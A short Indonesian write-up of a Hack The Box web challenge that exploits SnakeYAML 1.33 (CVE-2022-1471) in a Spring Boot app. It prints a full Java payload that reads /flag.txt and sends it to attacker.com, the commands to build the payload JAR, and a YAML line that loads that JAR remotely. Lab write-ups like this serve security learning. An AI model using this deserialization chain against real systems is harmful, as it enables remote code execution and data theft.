#web #easy #htb #writeup_twang #springboot


# Persiapan
Untuk mengerjakan CTF ini, kami menggunakan tool:
- Ngrok
- Python HTTP Server

# Steps
Website kali ini dibangun menggunakan bahasa Java. Dan berdasarkan isi dari `pom.xml`, kita dapat memastikan bahwa website menggunakan snake_yaml versi 1.33.
```sml
<dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>1.33</version>
        </dependency>
	</dependencies>
```

Versi `snake_yaml` tersebut memiliki celah Arbitrary Code Execution (CVE - 2022 - 1471). Referensi celah dan eksploitasi dapat ditemukan pada
- https://security.snyk.io/package/maven/org.yaml:snakeyaml/1.33 
- https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/
- https://github.com/artsploit/yaml-payload. 

Exploit ini dibuat bertujuan untuk mengambil konten file `/flag.txt` dan mengirimkan isi konten tersebut menuju `http://attacker.com/`.
```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.charset.StandardCharsets;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        Path filePath = Path.of("/flag.txt");
        try {
            String content = Files.readString(filePath, StandardCharsets.UTF_8);
            String urlString = "http://attacker.com/"+content;
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);

            // Read the response
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // Print the response
            System.out.println("Response:\n" + response.toString());

            // Disconnect the connection
            connection.disconnect();
            
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

```

Kemudian, compile file Java tersebut dan archive dengan menggunakan `jar`.
```sh
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

Selanjutnya, construct YAML untuk melakukan `ClassLoader` menuju JAR yang telah dibuat.
```yaml
snake_exploit: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://attacker.com/yaml-payload.jar"]]]]
```